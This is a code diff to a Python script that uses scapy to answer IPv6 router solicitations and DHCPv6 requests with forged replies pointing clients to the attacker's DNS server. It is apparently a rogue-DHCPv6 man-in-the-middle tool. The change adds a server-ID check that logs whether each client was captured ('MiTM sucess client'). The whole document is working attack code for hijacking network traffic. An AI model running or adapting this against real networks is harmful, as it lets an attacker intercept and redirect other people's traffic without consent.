@@ -6,7 +6,7 @@ from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv6Address
 from scapy.all import sniff, Ether, IPv6, ICMPv6ND_RS, DHCP6_Solicit, DHCP6_Request, DHCP6_Release, DHCP6_Confirm
-from scapy.all import DHCP6OptClientId
+from scapy.all import DHCP6OptClientId, DHCP6OptServerId
 from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
@@ -114,7 +114,7 @@ def reply(request):
                                                                    ipv6_addr=ipv6_address)
         try:
             SOCK.send(icmpv6_ra_packet)
-            print Base.c_success + "Send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
+            print Base.c_info + "Send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
                   request[Ether].src + ")"
         except:
             print Base.c_error + "Do not send ICMPv6 Router Advertisement reply to: " + request[IPv6].src + " (" + \
@@ -135,7 +135,7 @@ def reply(request):
                                                         client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
         try:
             SOCK.send(dhcpv6_advertise)
-            print Base.c_success + "Send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
+            print Base.c_info + "Send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
                   request[Ether].src + ")"
         except:
             print Base.c_error + "Do not send DHCPv6 Advertise reply to: " + request[IPv6].src + " (" + \
@@ -144,27 +144,33 @@ def reply(request):
     # DHCPv6 Request
     if request.haslayer(DHCP6_Request):
         print Base.c_info + "Sniff DHCPv6 Request from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid)
-        dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
-                                                ethernet_dst_mac=request[Ether].src,
-                                                ipv6_src=your_ipv6_link_address,
-                                                ipv6_dst=request[IPv6].src,
-                                                transaction_id=request[DHCP6_Request].trid,
-                                                dns_address=recursive_dns_address,
-                                                domain_search=dns_search,
-                                                ipv6_address=ipv6_address,
-                                                client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
-        try:
-            SOCK.send(dhcpv6_reply)
-            print Base.c_success + "Send DHCPv6 Reply to: " + request[IPv6].src + " (" + request[Ether].src + ")"
-        except:
-            print Base.c_error + "Do not send DHCPv6 Reply to: " + request[IPv6].src + " (" + \
-                  request[Ether].src + ")"
+              request[Ether].src + ") TID: " + hex(request[DHCP6_Request].trid) + \
+              " Server MAC: " + request[DHCP6OptServerId].duid.lladdr
+        # print request.summary
+        if request[DHCP6OptServerId].duid.lladdr == your_mac_address:
+            print Base.c_success + "MiTM sucess client: " + request[Ether].src
+            dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
+                                                    ethernet_dst_mac=request[Ether].src,
+                                                    ipv6_src=your_ipv6_link_address,
+                                                    ipv6_dst=request[IPv6].src,
+                                                    transaction_id=request[DHCP6_Request].trid,
+                                                    dns_address=recursive_dns_address,
+                                                    domain_search=dns_search,
+                                                    ipv6_address=ipv6_address,
+                                                    client_duid_timeval=request[DHCP6OptClientId].duid.timeval)
+            try:
+                SOCK.send(dhcpv6_reply)
+                print Base.c_info + "Send DHCPv6 Reply to: " + request[IPv6].src + " (" + request[Ether].src + ")"
+            except:
+                print Base.c_error + "Do not send DHCPv6 Reply to: " + request[IPv6].src + " (" + \
+                      request[Ether].src + ")"
+        else:
+            print Base.c_error + "MiTM fail client: " + request[Ether].src
 
     # DHCPv6 Release
     if request.haslayer(DHCP6_Release):
         print Base.c_info + "Sniff DHCPv6 Release from: " + request[IPv6].src + " (" + \
-              request[Ether].src + ")TID: " + hex(request[DHCP6_Release].trid)
+              request[Ether].src + ") TID: " + hex(request[DHCP6_Release].trid)
 
     # DHCPv6 Confirm
     if request.haslayer(DHCP6_Confirm):
